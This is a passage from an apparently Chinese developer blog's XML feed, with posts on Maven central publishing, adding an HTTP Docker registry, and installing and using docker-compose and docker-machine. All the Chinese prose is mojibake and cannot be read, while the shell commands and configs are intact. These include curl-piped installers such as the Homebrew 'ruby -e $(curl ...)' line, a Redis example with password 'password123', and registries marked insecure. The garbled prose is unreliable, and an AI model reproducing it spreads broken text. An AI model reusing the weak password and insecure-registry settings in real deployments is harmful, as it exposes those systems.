<p>æ‰“åŒ…æˆåŠŸï¼Œæç¤ºâ€œBUILD SUCCESSâ€åï¼Œå°±å®Œæˆäº†ã€‚</p>
<h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>æˆ‘çš„å·¥ç¨‹å’Œå·¥å•ä¿¡æ¯ï¼š<br>å·¥å•ï¼š<a href="https://issues.sonatype.org/browse/OSSRH-56616">OSSRH-56616</a><br>txtè§£æï¼šossrh-56616.soilove.cn<br>å·¥ç¨‹åœ°å€ï¼š<a href="https://github.com/Ln-guolin/spring-boot-starter-oss">spring-boot-starter-oss</a></p>
<p>ç›¸å…³ç«™ç‚¹ï¼Œè´¦å·é€šç”¨ï¼š<br>nexusä»“åº“: <a href="https://oss.sonatype.org/#welcome">oss.sonatype.org</a><br>èµ„æºæŸ¥è¯¢åœ°å€: <a href="http://search.maven.org/">search.maven.org</a></p>
]]></content>
      <categories>
        <category>maven</category>
      </categories>
      <tags>
        <tag>mavenä»“åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>dockeræ·»åŠ httpä»“åº“åœ°å€</title>
    <url>/2020/07/09/docker-add-http-addr/</url>
    <content><![CDATA[<h4 id="é”™è¯¯æç¤º"><a href="#é”™è¯¯æç¤º" class="headerlink" title="é”™è¯¯æç¤º"></a>é”™è¯¯æç¤º</h4><p>dockerä»“åº“è®¿é—®åœ°å€é»˜è®¤éƒ½æ˜¯httpsç±»å‹çš„ï¼Œä½†æˆ‘ä»¬æ­å»ºçš„ç§æœéƒ½æ˜¯httpçš„ï¼Œæ‰€ä»¥ç”¨dockerè®¿é—®ä»“åº“çš„æ—¶å€™å°±ä¼šæŠ›å‡ºå¦‚ä¸‹é”™è¯¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: Get https:&#x2F;&#x2F;soilove.cn:5000&#x2F;v2&#x2F;: http: server gave HTTP response to HTTPS client</span><br></pre></td></tr></table></figure>
<h4 id="è§£å†³æ–¹å¼"><a href="#è§£å†³æ–¹å¼" class="headerlink" title="è§£å†³æ–¹å¼"></a>è§£å†³æ–¹å¼</h4><p>è¿›å…¥/etc/dockerç›®å½•ï¼Œæ–°å»ºæ–‡ä»¶daemon.jsonï¼Œæ·»åŠ ä»“åº“åœ°å€ï¼Œç„¶åé‡å¯dockerå³å¯</p>
<p>é…ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://registry.docker-cn.com&quot;</span>,<span class="string">&quot;http://soilove.cn:5000&quot;</span>],</span><br><span class="line"> <span class="string">&quot;insecure-registries&quot;</span>: [<span class="string">&quot;https://registry.docker-cn.com&quot;</span>,<span class="string">&quot;http://soilove.cn:5000&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‡å¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload </span><br><span class="line"></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>dockerä»“åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerä¸‰å‰‘å®¢ä¹‹docker-compose</title>
    <url>/2018/09/16/docker-docker-compose/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>docker-composeæ˜¯ç¼–æ’å®¹å™¨çš„åˆ©å™¨ï¼Œç‰¹åˆ«æ˜¯æ¶‰åŠå¤šä¸ªå®¹å™¨çš„è¿è¡Œæ—¶ï¼Œä¸éœ€è¦æ•²å„ä¸ªå®¹å™¨çš„å¯åŠ¨å‚æ•°ï¼Œç¯å¢ƒå˜é‡ï¼Œå®¹å™¨å‘½åï¼ŒæŒ‡å®šä¸åŒå®¹å™¨çš„é“¾æ¥å‚æ•°ç­‰ç­‰ä¸€ç³»åˆ—çš„æ“ä½œï¼Œé€šè¿‡docker-composeï¼Œå®ƒå¯ä»¥è½»æ¾å®Œæˆå®¹å™¨ç¼–æ’ï¼Œå¹¶ä¸”æä¾›äº†scaleæ‰©å®¹åŠŸèƒ½ã€‚</p>
<h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>åœ¨githubå®˜ç½‘ä¸Šæœ‰æä¾›å®‰è£…çš„æ–¹å¼ï¼Œç›´æ¥ä¸‹è½½äºŒè¿›åˆ¶åŒ…è¿›è¡Œå®‰è£…å³å¯ã€‚</p>
<p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/docker/compose/releases/">https://github.com/docker/compose/releases/</a> </p>
<p>å®‰è£…å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.27.4/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"></span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p>ç„¶åï¼ŒéªŒè¯å®‰è£…æƒ…å†µï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<p>å®˜ç½‘æœ‰ä»‹ç»ï¼Œå¦‚æœä½ ä»¬macæˆ–è€…windowsç”¨æˆ·ï¼Œæ­£å¸¸æƒ…å†µï¼Œä½ å®‰è£…äº†dockerå®¢æˆ·ç«¯å°±é»˜è®¤å®‰è£…äº†docker-composeã€‚</p>
<h4 id="å¸è½½"><a href="#å¸è½½" class="headerlink" title="å¸è½½"></a>å¸è½½</h4><p>å¦‚æœä½¿ç”¨curlå®‰è£…çš„ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤å¸è½½Docker Compose ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure>
<h4 id="å®æˆ˜ç»ƒä¹ "><a href="#å®æˆ˜ç»ƒä¹ " class="headerlink" title="å®æˆ˜ç»ƒä¹ "></a>å®æˆ˜ç»ƒä¹ </h4><h5 id="æ„å»ºredisæ•°æ®åº“"><a href="#æ„å»ºredisæ•°æ®åº“" class="headerlink" title="æ„å»ºredisæ•°æ®åº“"></a>æ„å»ºredisæ•°æ®åº“</h5><p>1ï¼Œæˆ‘ä»¬ä½¿ç”¨redisæ¥åšæ¼”ç¤ºï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹å‘½ä»¤è¡Œç›´æ¥è¿è¡Œredisçš„æ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 6379:6379 --name some-redis -v &#x2F;my&#x2F;own&#x2F;redis&#x2F;data:&#x2F;data redis:3.2.9 redis-server --appendonly yes --requirepass &quot;password123&quot;</span><br></pre></td></tr></table></figure>
<p>2ï¼Œç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨docker-composeæ¥å‚è€ƒæ„å»ºï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªdocker-compose.ymlæ–‡ä»¶ï¼Œå¹¶æ·»ä¸‹é¢çš„å†…å®¹ï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">   <span class="attr">redis:</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">redis:3.2.9</span></span><br><span class="line">     <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">data:/my/own/redis/data</span></span><br><span class="line">     <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">     <span class="attr">command:</span>  <span class="string">redis-server</span> <span class="string">--appendonly</span> <span class="literal">yes</span> <span class="string">--requirepass</span> <span class="string">&quot;password123&quot;</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">data:</span></span><br></pre></td></tr></table></figure>
<p>3ï¼Œæ‰§è¡Œæ„å»º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h5 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h5><p>ä¸‹é¢åˆ—å‡ºå‡ ä¸ªæ—¶å¸¸ä¼šç”¨åˆ°çš„docker-composeå‘½ä»¤ </p>
<p><strong>config</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose config </span><br><span class="line">è§£é‡Šï¼šéªŒè¯compose ymlæ–‡ä»¶æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œè‹¥æ­£ç¡®åˆ™æ˜¾ç¤ºé…ç½®ï¼Œè‹¥æ ¼å¼é”™è¯¯æ˜¾ç¤ºé”™è¯¯åŸå›  </span><br></pre></td></tr></table></figure>
<p><strong>ps</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼š docker-compose ps [options] [SERVICE...] </span><br><span class="line">è§£é‡Šï¼šåˆ—å‡ºé¡¹ç›®ä¸­ç›®å‰çš„æ‰€æœ‰å®¹å™¨ã€‚ é€‰é¡¹ï¼š -q åªæ‰“å°å®¹å™¨çš„ ID ä¿¡æ¯ </span><br></pre></td></tr></table></figure>
<p><strong>images</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose images </span><br><span class="line">è§£é‡Šï¼šåˆ—å‡ºé¡¹ç›®ä¸­çš„æ‰€æœ‰å®¹å™¨é•œåƒ </span><br></pre></td></tr></table></figure>
<p><strong>up</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose up [options] [SERVICE...] </span><br><span class="line">è§£é‡Šï¼šé€šå¸¸ä½¿ç”¨â€œdocker-compose up -dâ€è‡ªåŠ¨å®ŒæˆåŒ…æ‹¬æ„å»ºé•œåƒï¼Œï¼ˆé‡æ–°ï¼‰åˆ›å»ºæœåŠ¡ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå¹¶å…³è”æœåŠ¡ç›¸å…³å®¹å™¨çš„ä¸€ç³»åˆ—æ“ä½œï¼Œåœ¨åå°è¿è¡Œã€‚ </span><br><span class="line">å¦‚æœæœåŠ¡å®¹å™¨å·²ç»å­˜åœ¨ï¼Œup å°†ä¼šå°è¯•åœæ­¢å®¹å™¨ï¼Œç„¶åé‡æ–°åˆ›å»ºï¼Œä»¥ä¿è¯æ–°å¯åŠ¨çš„æœåŠ¡åŒ¹é… docker-compose.ymlæ–‡ä»¶çš„æœ€æ–°å†…å®¹ã€‚ </span><br><span class="line">å¦‚æœç”¨æˆ·ä¸å¸Œæœ›å®¹å™¨è¢«åœæ­¢å¹¶é‡æ–°åˆ›å»ºï¼Œå¯ä»¥æ·»åŠ â€œ--no-recreateâ€æŒ‡ä»¤ï¼Œå°†åªä¼šå¯åŠ¨å¤„äºåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œè€Œå¿½ç•¥å·²ç»è¿è¡Œçš„æœåŠ¡ã€‚ </span><br><span class="line">å¦‚æœç”¨æˆ·åªæƒ³é‡æ–°éƒ¨ç½²æŸä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ docker-compose up --no-deps -d &lt;SERVICE_NAME&gt; æ¥é‡æ–°åˆ›å»ºæœåŠ¡å¹¶åå°åœæ­¢æ—§æœåŠ¡ï¼Œå¯åŠ¨æ–°æœåŠ¡ï¼Œå¹¶ä¸ä¼šå½±å“åˆ°å…¶æ‰€ä¾èµ–çš„æœåŠ¡ã€‚ </span><br><span class="line">é€‰é¡¹ï¼š </span><br><span class="line">  -d åœ¨åå°è¿è¡ŒæœåŠ¡å®¹å™¨ </span><br><span class="line">  --no-color ä¸ä½¿ç”¨é¢œè‰²æ¥åŒºåˆ†ä¸åŒçš„æœåŠ¡çš„æ§åˆ¶å°è¾“å‡º </span><br><span class="line">  --no-deps ä¸å¯åŠ¨æœåŠ¡æ‰€é“¾æ¥çš„å®¹å™¨ </span><br><span class="line">  --force-recreate å¼ºåˆ¶é‡æ–°åˆ›å»ºå®¹å™¨ï¼Œä¸èƒ½ä¸ --no-recreate åŒæ—¶ä½¿ç”¨ </span><br><span class="line">  --no-recreate å¦‚æœå®¹å™¨å·²ç»å­˜åœ¨äº†ï¼Œåˆ™ä¸é‡æ–°åˆ›å»ºï¼Œä¸èƒ½ä¸ --force-recreate åŒæ—¶ä½¿ç”¨ </span><br><span class="line">  --no-build ä¸è‡ªåŠ¨æ„å»ºç¼ºå¤±çš„æœåŠ¡é•œåƒ </span><br><span class="line">  -t, --timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ </span><br></pre></td></tr></table></figure>
<p><strong>start</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose start [SERVICE...] </span><br><span class="line">è§£é‡Šï¼šå¯åŠ¨å·²ç»å­˜åœ¨çš„æœåŠ¡å®¹å™¨ã€‚ </span><br></pre></td></tr></table></figure>
<p><strong>stop</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼š docker-compose stop [options] [SERVICE...] </span><br><span class="line">è§£é‡Šï¼šåœæ­¢å·²ç»å¤„äºè¿è¡ŒçŠ¶æ€çš„å®¹å™¨ï¼Œä½†ä¸åˆ é™¤å®ƒ é€‰é¡¹ï¼š -t, --timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ ï¼‰</span><br></pre></td></tr></table></figure>
<p><strong>restart</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose restart [options] [SERVICE...] </span><br><span class="line">è§£é‡Šï¼šé‡å¯é¡¹ç›®ä¸­çš„æœåŠ¡ </span><br></pre></td></tr></table></figure>
<p><strong>rm</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose rm [options] [SERVICE...] </span><br><span class="line">è§£é‡Šï¼šåˆ é™¤æ‰€æœ‰ï¼ˆåœæ­¢çŠ¶æ€çš„ï¼‰æœåŠ¡å®¹å™¨ï¼Œæ¨èå…ˆæ‰§è¡Œ docker-compose stop å‘½ä»¤æ¥åœæ­¢å®¹å™¨ã€‚ </span><br><span class="line">é€‰é¡¹ï¼š -f, --force å¼ºåˆ¶ç›´æ¥åˆ é™¤ï¼ŒåŒ…æ‹¬éåœæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚å°½é‡ä¸è¦ä½¿ç”¨è¯¥é€‰é¡¹ -v åˆ é™¤å®¹å™¨æ‰€æŒ‚è½½çš„æ•°æ®å· </span><br></pre></td></tr></table></figure>
<p><strong>logs</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose logs [options] [SERVICE...] </span><br><span class="line">è§£é‡Šï¼šæŸ¥çœ‹æœåŠ¡å®¹å™¨çš„è¾“å‡ºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker-compose å°†å¯¹ä¸åŒçš„æœåŠ¡è¾“å‡ºä½¿ç”¨ä¸åŒçš„é¢œè‰²æ¥åŒºåˆ†,å¯ä»¥é€šè¿‡ --no-color æ¥å…³é—­é¢œè‰²ã€‚ </span><br></pre></td></tr></table></figure>
<p><strong>scale</strong> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šdocker-compose scale [options] [SERVICE&#x3D;NUM...] </span><br><span class="line">è§£é‡Šï¼šè®¾ç½®æŒ‡å®šæœåŠ¡è¿è¡Œçš„å®¹å™¨ä¸ªæ•°ï¼Œä¸€èˆ¬åœ¨éœ€è¦è¿›è¡Œæ‰©å®¹çš„æ—¶å€™ç”¨åˆ°ï¼Œé€šè¿‡ service&#x3D;num çš„å‚æ•°æ¥è®¾ç½®æ•°é‡ã€‚</span><br><span class="line">ä¾‹å¦‚ï¼š docker-compose scale mysql&#x3D;3 redis&#x3D;2 å°†å¯åŠ¨3ä¸ªå®¹å™¨è¿è¡ŒmysqlæœåŠ¡ï¼Œ2ä¸ªå®¹å™¨è¿è¡ŒredisæœåŠ¡ã€‚</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker-compose</tag>
        <tag>dockerä¸‰å‰‘å®¢</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerä¸‰å‰‘å®¢ä¹‹docker-machine</title>
    <url>/2018/09/16/docker-docker-machine/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä½ å¯ä»¥ç”¨docker machineæ¥åšä»€ä¹ˆï¼Ÿ<br>1ï¼Œåœ¨macå’Œwindowså¹³å°ä¸Šå®‰è£…å’Œè¿è¡Œdocker<br>2ï¼Œæä¾›å’Œç®¡ç†å¤šä¸ªè¿œç¨‹dockerä¸»æœº<br>3ï¼Œæä¾›swarmé›†ç¾¤ç®¡ç† </p>
<h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>å®‰è£…å¾ˆç®€å•ï¼Œç›´æ¥ä»githubä¸‹è½½ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶å³å¯ï¼Œä¹Ÿå¯ä»¥å‚è€ƒ<a href="https://docs.docker.com/machine/overview/">å®˜ç½‘è¯¦ç»†ä»‹ç»</a><br>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/docker/machine/releases">https://github.com/docker/machine/releases</a> </p>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/machine/releases/download/v0.16.2/docker-machine-`uname -s`-`uname -m` &gt;/tmp/docker-machine &amp;&amp;</span><br><span class="line">chmod +x /tmp/docker-machine &amp;&amp;</span><br><span class="line">sudo cp /tmp/docker-machine /usr/<span class="built_in">local</span>/bin/docker-machine</span><br></pre></td></tr></table></figure>
<h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><p>macå®¢æˆ·ç«¯å·²ç»åŒ…å«äº†machineï¼Œå…¶å®æ— éœ€å•ç‹¬å®‰è£…ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/machine/releases/download/v0.16.2/docker-machine-`uname -s`-`uname -m` &gt;/usr/<span class="built_in">local</span>/bin/docker-machine &amp;&amp; </span><br><span class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-machine</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹machineå®‰è£…ç‰ˆæœ¬ï¼Œå¯ä»¥æ­£å¸¸è¾“å‡ºç‰ˆæœ¬ä¿¡æ¯å³å¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine -v</span><br></pre></td></tr></table></figure>
<p>Â </p>
<h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><h5 id="1ï¼Œåˆ›å»ºä¸»æœº"><a href="#1ï¼Œåˆ›å»ºä¸»æœº" class="headerlink" title="1ï¼Œåˆ›å»ºä¸»æœº"></a>1ï¼Œåˆ›å»ºä¸»æœº</h5><p>1ï¼Œåˆ›å»ºä¸»æœºèŠ‚ç‚¹ï¼Œä¸åŒçš„æœåŠ¡å™¨ï¼Œå¯èƒ½æ”¯æŒçš„é©±åŠ¨ä¸åŒï¼Œæ‰€ä»¥è¦æŒ‰éœ€å¤„ç† </p>
<h6 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h6><p>ç›´æ¥é€‰æ‹©virtualboxç±»å‹çš„é©±åŠ¨æ¥åˆ›å»ºä¸»æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d virtualbox <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<h6 id="ECS-Centos"><a href="#ECS-Centos" class="headerlink" title="ECS-Centos"></a>ECS-Centos</h6><p>éœ€è¦ä½¿ç”¨é˜¿é‡Œäº‘æä¾›çš„é©±åŠ¨ECS Driveræ¥åˆ›å»ºï¼Œ å‚è§ï¼š<a href="https://develop.aliyun.com/command/docker">é©±åŠ¨ä¸‹è½½å’Œå®‰è£…æ–‡æ¡£</a> </p>
<p>å®‰è£…é©±åŠ¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir docker-machine</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> docker-machine</span><br><span class="line"></span><br><span class="line">wget https://docker-machine-drivers.oss-cn-beijing.aliyuncs.com/docker-machine-driver-aliyunecs_linux-amd64.tgz</span><br><span class="line"></span><br><span class="line">mv docker-machine-driver-aliyunecs_linux-amd64.tgz driver-aliyunecs.tgz</span><br><span class="line"></span><br><span class="line">tar -zxvf driver-aliyunecs.tgz</span><br><span class="line"></span><br><span class="line">cp bin/docker-machine-driver-aliyunecs.linux-amd64 /usr/<span class="built_in">local</span>/bin/docker-machine-driver-aliyunecs</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨é˜¿é‡Œäº‘é©±åŠ¨aliyunecsï¼Œåˆ›å»ºåˆ›å»ºä¸»æœºæ—¶ï¼Œ<strong>aliyunecs-access-key-id</strong> å’Œ <strong>aliyunecs-access-key-secret</strong> æ˜¯å¿…å¡«å‚æ•°ï¼Œå¯ä»¥ç›´æ¥åœ¨aliyunecsåè¿½åŠ ï¼Œä¹Ÿå¯ä»¥è®¾ç½®åˆ°ç¯å¢ƒå˜é‡å½“ä¸­ã€‚</p>
<p>è®¾ç½®ç¯å¢ƒå˜é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> ECS_ACCESS_KEY_ID=<span class="string">&#x27;&lt;Your access key ID&gt;&#x27;</span></span><br><span class="line"><span class="built_in">export</span> ECS_ACCESS_KEY_SECRET=<span class="string">&#x27;&lt;Your secret access key&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºä¸»æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d aliyunecs testali</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤å‚æ•°å‚è€ƒï¼š <a href="https://github.com/AliyunContainerService/docker-machine-driver-aliyunecs">ç‚¹æˆ‘æŸ¥çœ‹å‘½ä»¤è¯¦ç»†ä»‹ç»</a> Â  </p>
<h6 id="Mac-1"><a href="#Mac-1" class="headerlink" title="Mac"></a>Mac</h6><p>ä½¿ç”¨xhyveé©±åŠ¨ï¼Œåˆæ¬¡ä½¿ç”¨å¾—å…ˆå®‰è£…ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install docker-machine-driver-xhyve</span><br><span class="line"></span><br><span class="line">sudo chown root:wheel $(brew --prefix)/opt/docker-machine-driver-xhyve/bin/docker-machine-driver-xhyve</span><br><span class="line"></span><br><span class="line">sudo chmod u+s $(brew --prefix)/opt/docker-machine-driver-xhyve/bin/docker-machine-driver-xhyve</span><br></pre></td></tr></table></figure>
<p>å¦‚æœmacä¸Šæ²¡æœ‰è£…brewå·¥å…·ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤å®‰è£…brewï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨å‚æ•°(æ›´å¤šå‘½ä»¤æŸ¥çœ‹:â€œdocker-machine create -d xhyve -helpâ€)ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">é…ç½®dockerä¸»æœºé•œåƒæ–‡ä»¶åœ°å€ï¼š--xhyve-boot2docker-url ~&#x2F;.docker&#x2F;machine&#x2F;cache&#x2F;boot2docker.iso</span><br><span class="line">é…ç½®Dockerçš„ä»“åº“é•œåƒï¼š--engine-registry-mirror https:&#x2F;&#x2F;registry.docker-cn.com</span><br><span class="line">é…ç½®ä¸»æœºå†…å­˜ï¼š--virtualbox-memory 2048</span><br><span class="line">é…ç½®ä¸»æœºCPUï¼š--virtualbox-cpu-count 2</span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºä¸»æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine create -d xhyve --xhyve-boot2docker-url ~/.docker/machine/cache/boot2docker.iso --engine-registry-mirror https://registry.docker-cn.com <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<h5 id="2ï¼ŒæŸ¥è¯¢ä¸»æœº"><a href="#2ï¼ŒæŸ¥è¯¢ä¸»æœº" class="headerlink" title="2ï¼ŒæŸ¥è¯¢ä¸»æœº"></a>2ï¼ŒæŸ¥è¯¢ä¸»æœº</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ls</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºå¦‚ä¸‹å³å¯ï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORS</span><br><span class="line">test - xhyve Running tcp:&#x2F;&#x2F;192.168.64.2:2376 v18.06.1-ce</span><br></pre></td></tr></table></figure>

<h5 id="3ï¼Œè¿æ¥ä¸»æœº"><a href="#3ï¼Œè¿æ¥ä¸»æœº" class="headerlink" title="3ï¼Œè¿æ¥ä¸»æœº"></a>3ï¼Œè¿æ¥ä¸»æœº</h5><p>å°è¯•ç™»å½•sshè¿æ¥åˆ°docker-machineä¸»æœºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ssh <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>aï¼ŒæŸ¥çœ‹ä¸»æœºçš„dockerç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker -v</span><br></pre></td></tr></table></figure>
<p>bï¼Œå°è¯•è¿è¡Œå®¹å™¨ï¼Œä»¥portainerä¸ºä¾‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart always -v /var/run/docker.sock:/var/run/docker.sock -v /opt/portainer:/data portainer/portainer</span><br></pre></td></tr></table></figure>
<p>cï¼Œå…ˆä½¿ç”¨å‘½ä»¤ï¼š<strong>exit</strong> é€€å‡ºä¸»æœºï¼Œç„¶åæŸ¥çœ‹IPï¼Œå¹¶å°è¯•åœ¨ä¸»æœºæµè§ˆå™¨ä¸Šè®¿é—®å¯åŠ¨çš„portainerå®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ip <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>æµè§ˆå™¨è®¿é—®ï¼š<a href="http://ip:9000/">http://ip:9000</a> ï¼Œèƒ½æ­£å¸¸è®¿é—®å³å¯ï¼ Â </p>
<h4 id="æŠ¥é”™å¤„ç†"><a href="#æŠ¥é”™å¤„ç†" class="headerlink" title="æŠ¥é”™å¤„ç†"></a>æŠ¥é”™å¤„ç†</h4><p>åšä»€ä¹ˆäº‹æƒ…ä¸é‡åˆ°äº›é”™è¯¯æ˜¯ä¸å¯èƒ½çš„ï¼Œè¿™æ¬¡æ˜¯è¸©äº†ä¸å°‘å‘ï¼Œè®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ä¸‹æ¬¡å®¡é˜…ã€‚ </p>
<p><strong>é”™è¯¯1:</strong> </p>
<p>æˆ‘æ˜¯åœ¨é˜¿é‡Œäº‘ECSä¸Šä½¿ç”¨çš„æ—¶å€™æç¤ºçš„é”™è¯¯ï¼š </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path_ </span><br></pre></td></tr></table></figure>
<p>è§£å†³åŠæ³•ï¼š<br>é…ç½®å®‰è£…æºï¼Œå®‰è£…VirtualBox</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/yum.repos.d/virtualbox.repo</span><br></pre></td></tr></table></figure>
<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
